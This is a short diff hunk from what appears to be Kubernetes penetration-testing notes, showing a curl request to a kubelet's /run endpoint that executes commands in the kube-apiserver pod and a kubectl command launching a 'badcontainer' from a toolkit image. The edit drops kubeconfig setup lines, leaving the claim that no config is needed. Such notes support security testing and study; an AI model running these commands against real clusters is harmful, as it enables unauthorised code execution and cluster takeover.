@@ -45,9 +45,9 @@ curl -k -XPOST "https://192.168.111.10:10250/run/kube-system/kube-apiserver-kube
 
 # Using Service Tokens
 
-export KUBECONFIG=/root/admin.conf
 kubectl run badcontainer --image=192.168.111.50:5000/alpine-containertools
-kubectl config set-cluster test --server=https://192.168.111.10:6443
+
+No config needed, it just knows where to go.
 
 ## Attacking the API Server
 
